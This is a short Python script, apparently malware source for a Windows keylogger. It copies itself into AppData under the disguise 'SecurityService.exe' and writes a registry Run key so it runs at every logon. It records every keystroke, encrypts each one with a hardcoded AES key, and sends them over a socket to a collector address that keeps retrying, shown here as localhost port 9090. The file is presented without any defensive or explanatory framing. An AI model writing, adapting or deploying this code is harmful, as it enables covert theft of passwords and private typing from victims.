import socket
from pynput.keyboard import Listener
import time
from Crypto.Cipher import AES
import sys
import shutil
import winreg, getpass

user = getpass.getuser()
target_path = "C:\\Users\\" + user + "\\AppData\\Local\\Microsoft\\Windows\\Safety\\SecurityService.exe"
try:
    shutil.copyfile(sys.argv[0], target_path)
except shutil.SameFileError:
   pass

reghive = winreg.HKEY_CURRENT_USER
regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

reg = winreg.ConnectRegistry(None, reghive)
key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, "SecurityService", 0, winreg.REG_SZ, target_path)

def encryptData(textToEncrypt: str):
    aes = AES.new(b'Fm!t%68Hava!wq&)', AES.MODE_CFB, b'Fh78&rsV2!894R6$')
    encryptedText = aes.encrypt(textToEncrypt.encode())
    return encryptedText

connected = False 
while not connected:
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:  
        clientSocket.connect(("127.0.0.1",9090))
        connected = True  

        def on_press(key):
            clientSocket.send(encryptData(str(key)))
        
        try:
            with Listener(on_press=on_press) as listener:
                listener.join()

        except socket.error:
            connected = False

    except socket.error:  
        time.sleep(15)